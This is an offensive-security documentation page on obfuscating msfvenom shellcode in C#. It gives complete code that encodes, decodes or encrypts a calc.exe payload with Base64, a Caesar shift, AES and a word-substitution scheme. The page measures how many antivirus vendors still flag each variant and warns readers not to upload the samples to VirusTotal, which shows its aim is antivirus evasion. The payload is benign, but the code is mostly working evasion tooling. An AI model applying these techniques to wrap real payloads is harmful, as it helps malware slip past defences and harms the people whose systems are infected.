---
title: "Shellcode obfuscation"
Description: Using different ciphers to obfuscate shellcodes in .exe files
draft: false
images: []
menu:
  docs:
    parent: "Active Directory"
weight: 6
toc: true
---
## <span style="color:#208355"> Raw Shellcode

Raw shellcode example.

```csharp
using System;
 
namespace ShellcodeEncoding
{
    internal class Program
    {
 
        static void Main(string[] args)
        {
            // msfvenom -p windows/x64/exec CMD=calc.exe -f csharp
            byte[] Shellcode = new byte[276] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
            0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
            0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
            0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
            0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
            0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
            0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
            0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
            0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
            0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
            0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
            0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
            0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
            0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
            0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
            0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
            0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
            0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
            0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
            0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
            0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
            0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
            0x63,0x2e,0x65,0x78,0x65,0x00};
 
            Console.WriteLine(Shellcode);
        }
    }
}
```

## <span style="color:#208355"> Base64 Encoded Shellcode
```csharp
using System;
 
namespace ShellcodeEncoding
{
    internal class Program
    {
        public static string Decode(string base64EncodedData)
        {
            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        }
        static void Main(string[] args)
        {
            // msfvenom -p windows/x64/exec CMD=calc.exe -f base64
            string Shellcode = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";
 
            Console.WriteLine(Decode(Shellcode));
        }
    }
}
```

## <span style="color:#208355"> Caesar Cipher Encoded Shellcode

In this example we add a small encoded routine to obfuscate the Shellcode through character substitution. Two vendors still classify this as malicious;

```csharp
using System;
using System.Text;
 
namespace ShellcodeEncoding
{
    internal class Program
    {
 
        public static byte[] Decode(byte[] buf)
        {
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 4) & 0xFF);
            }
            return buf;
        }
 
        static void Main(string[] args)
        {
            // msfvenom -p windows/x64/exec CMD=calc.exe -f csharp
            byte[] Shellcode = new byte[276] { 0x00, 0x4c, 0x87, 0xe8, 0xf4, 0xec, 0xc4, 0x04, 0x04, 0x04, 0x45, 0x55, 0x45, 0x54, 0x56, 0x55, 0x5a, 0x4c, 0x35, 0xd6, 0x69, 0x4c, 0x8f, 0x56, 0x64, 0x4c, 0x8f, 0x56, 0x1c, 0x4c, 0x8f, 0x56, 0x24, 0x4c, 0x8f, 0x76, 0x54, 0x4c, 0x13, 0xbb, 0x4e, 0x4e, 0x51, 0x35, 0xcd, 0x4c, 0x35, 0xc4, 0xb0, 0x40, 0x65, 0x80, 0x06, 0x30, 0x24, 0x45, 0xc5, 0xcd, 0x11, 0x45, 0x05, 0xc5, 0xe6, 0xf1, 0x56, 0x45, 0x55, 0x4c, 0x8f, 0x56, 0x24, 0x8f, 0x46, 0x40, 0x4c, 0x05, 0xd4, 0x8f, 0x84, 0x8c, 0x04, 0x04, 0x04, 0x4c, 0x89, 0xc4, 0x78, 0x6b, 0x4c, 0x05, 0xd4, 0x54, 0x8f, 0x4c, 0x1c, 0x48, 0x8f, 0x44, 0x24, 0x4d, 0x05, 0xd4, 0xe7, 0x5a, 0x4c, 0x03, 0xcd, 0x45, 0x8f, 0x38, 0x8c, 0x4c, 0x05, 0xda, 0x51, 0x35, 0xcd, 0x4c, 0x35, 0xc4, 0xb0, 0x45, 0xc5, 0xcd, 0x11, 0x45, 0x05, 0xc5, 0x3c, 0xe4, 0x79, 0xf5, 0x50, 0x07, 0x50, 0x28, 0x0c, 0x49, 0x3d, 0xd5, 0x79, 0xdc, 0x5c, 0x48, 0x8f, 0x44, 0x28, 0x4d, 0x05, 0xd4, 0x6a, 0x45, 0x8f, 0x10, 0x4c, 0x48, 0x8f, 0x44, 0x20, 0x4d, 0x05, 0xd4, 0x45, 0x8f, 0x08, 0x8c, 0x4c, 0x05, 0xd4, 0x45, 0x5c, 0x45, 0x5c, 0x62, 0x5d, 0x5e, 0x45, 0x5c, 0x45, 0x5d, 0x45, 0x5e, 0x4c, 0x87, 0xf0, 0x24, 0x45, 0x56, 0x03, 0xe4, 0x5c, 0x45, 0x5d, 0x5e, 0x4c, 0x8f, 0x16, 0xed, 0x5b, 0x03, 0x03, 0x03, 0x61, 0x4c, 0xbe, 0x05, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04, 0x4c, 0x91, 0x91, 0x05, 0x05, 0x04, 0x04, 0x45, 0xbe, 0x35, 0x8f, 0x73, 0x8b, 0x03, 0xd9, 0xbf, 0xf4, 0xb9, 0xa6, 0x5a, 0x45, 0xbe, 0xaa, 0x99, 0xc1, 0xa1, 0x03, 0xd9, 0x4c, 0x87, 0xc8, 0x2c, 0x40, 0x0a, 0x80, 0x0e, 0x84, 0xff, 0xe4, 0x79, 0x09, 0xbf, 0x4b, 0x17, 0x76, 0x73, 0x6e, 0x04, 0x5d, 0x45, 0x8d, 0xde, 0x03, 0xd9, 0x67, 0x65, 0x70, 0x67, 0x32, 0x69, 0x7c, 0x69, 0x04 };
 
            byte[] DecodedShellcode = Decode(Shellcode);
 
            Console.WriteLine(System.Text.Encoding.Default.GetString(DecodedShellcode));
 
        }
    }
}
```

## <span style="color:#208355"> AES Encryption

The below encoding routine produces a Base64 encoded AES encrypted string containing our shellcode;

```csharp
using System;
using System.Text;
using System.IO;
using System.Security.Cryptography;
 
namespace ShellcodeEncoding
{
    public class AesOperation
    {
        public static string EncryptString(string key, string plainText)
        {
            byte[] iv = new byte[16];
            byte[] array;
 
            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(key);
                aes.IV = iv;
 
                ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);
 
                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream((Stream)memoryStream, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter streamWriter = new StreamWriter((Stream)cryptoStream))
                        {
                            streamWriter.Write(plainText);
                        }
 
                        array = memoryStream.ToArray();
                    }
                }
            }
 
            return Convert.ToBase64String(array);
        }
    }
 
    internal class Program
    {
 
        static void Main(string[] args)
        {
 
            byte[] Shellcode = new byte[276] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
            0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
            0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
            0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
            0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
            0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
            0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
            0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
            0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
            0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
            0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
            0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
            0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
            0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
            0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
            0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
            0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
            0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
            0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
            0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
            0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
            0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
            0x63,0x2e,0x65,0x78,0x65,0x00};
 
            var key = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
            var str = System.Text.Encoding.Default.GetString(Shellcode);
            var encryptedString = AesOperation.EncryptString(key, str);
            Console.WriteLine($"encrypted string = {encryptedString}");
 
            Console.ReadKey();
 
 
        }
    }
}
```

The following code is used to decrypt the Shellcode.

```csharp
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
 
namespace AESShellcodeDecoder
{
 
    public class AesOperation
    {
        public static string DecryptString(string key, string cipherText)
        {
            byte[] iv = new byte[16];
            byte[] buffer = Convert.FromBase64String(cipherText);
 
            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(key);
                aes.IV = iv;
                ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);
 
                using (MemoryStream memoryStream = new MemoryStream(buffer))
                {
                    using (CryptoStream cryptoStream = new CryptoStream((Stream)memoryStream, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader streamReader = new StreamReader((Stream)cryptoStream))
                        {
                            return streamReader.ReadToEnd();
                        }
                    }
                }
            }
        }
    }
 
    internal class Program
    {
        static void Main(string[] args)
        {
            var key = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
            var encryptedString = "PvQTvpmGEXoytPgdWgCrw3x+kRy+hZ+ArvlFDE202ZoaZ1PGfOycx9IRFYEpGj3s28QSVOq8uhmLrHUmslOaI5pP4j9zijlh7c3EofdTyOhyNQsOfJVL4ti1IcYe03Wd7Bk1RVCZ9YaZuBR8PQ+SFEz32w3FkBBQEPKd2fjltagDoML9xOrjFoPnVxtOBtwFHds4NwJ6Hqx1RNBD1WBjH3aKCgk1v7fsrbzIRj8nMva+A3JOpO83XMmCxkVm2Iu1ZQFt50H5wa20N0d3FMms/epIgtqBBDVlPCdGmXaVkfzVBUBgxwGo3WHtIbVyM4FJnOy2oY+16jMXh1Nin+HlBf6n9Lg5fkEuLvt9KusXn6dLkP9VPj/gSC09sPyy9AyeCWnBqlw7TErlLNlJ4YkYuV4w6gOsMNgVb+iIPxVfHTOqZ3dSqf+Thz0gchn1Gx06FIdmIc2OeIOkvoWyxIZrEpgJxJNRPoYtBCfXsAGfZXv24b+xDqpbGA0i/muzxOYtFOHSRyvFdf1HeaG30cWcqQ==";
            var decryptedString = AesOperation.DecryptString(key, encryptedString);
            Console.WriteLine($"decrypted string = {decryptedString}");
        }
    }
}
```
## <span style="color:#208355"> Encoding using Words

First, we define a list of words in a separate class. For the sake of brevity I’ve limited the number of words included. However, we need 256 words defined in the WordList List; one for each possible byte.

```csharp
using System.Collections.Generic;
 
namespace Encoding
{
 
    public class Words
    {
 
        public static List<string> EncodedWordList = new List<string>
        {
            "glue",
            "impartial",
            "optimal"
             };
     
        public static List<string> WordList = new List<string>  {
            "scarce",
            "annoy",
            "sore",
            "cowardly"
            };
    }
}
```
Next we need an encoding routine to convert Shellcode into a list of words.

```csharp
using System;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.Linq;
using System.Collections.Generic;
using System.Collections;
 
namespace ShellcodeEncoding
{
 
    internal class Program
    {
        static List<string> Encode(byte[] Shellcode)
        {
            // Loop over shellcode byte array and convert it to words
            List<string> WordList = new List<string>();
 
            for (int i = 0; i < Shellcode.Length; i++)
            {
                WordList.Add(Words.WordList[Shellcode[i]]);
            }
            return WordList;
        }
 
        static void Main(string[] args)
        {
 
            byte[] Shellcode = new byte[276] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
            0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
            0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
            0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
            0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
            0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
            0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
            0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
            0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
            0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
            0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
            0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
            0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
            0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
            0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
            0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
            0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
            0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
            0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
            0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
            0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
            0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
            0x63,0x2e,0x65,0x78,0x65,0x00};
 
            List<string> WordList = Encode(Shellcode);
 
            foreach (string word in WordList)
            {
                Console.WriteLine('"'+ word + '"' + ',');
            }
 
            Console.WriteLine("Number of entries; " + WordList.Count);
 
            Console.ReadKey();
 
        }
    }
}
```

Running the code will print out a list of words, with each word corresponding to a byte of Shellcode. This list of words will need to be added to the EncodedWordList List in the Words class.

```csharp
Encoding.exe
"glue",
"impartial",
"optimal",
"psychedelic",
"cheat",
"desert",
"inject",
"scarce",
"scarce",
"scarce",
"peep",
"quixotic",
"peep",
<snip>
```
#### <span style="color:#208355"> Decoding Routine

The following routine just converts our words back to a byte array.

```csharp
using System;
using System.Collections.Generic;
 
namespace Encoding
{
    internal class Program
    {
        static byte[] Decode(List<string> WordList)
        {
            List<byte> code = new List<byte>();
 
            foreach (string word in WordList)
            {
                int index = Words.WordList.FindIndex(a => a.Contains(word));
                byte byteValue = (byte)index;
                code.Add(byteValue);
            }
 
            byte[]  CodeArray = code.ToArray();
            return CodeArray;
        }
         
 
        static void Main(string[] args)
        {   
            byte[] CodeArray = Decode(Words.EncodedWordList);
            Console.WriteLine(System.Text.Encoding.Default.GetString(CodeArray));
            Console.ReadKey();
 
        }
    }
}
```
---
Do not upload this shellcodes to virus total.

Credits: https://www.bordergate.co.uk/shellcode-obfuscation/
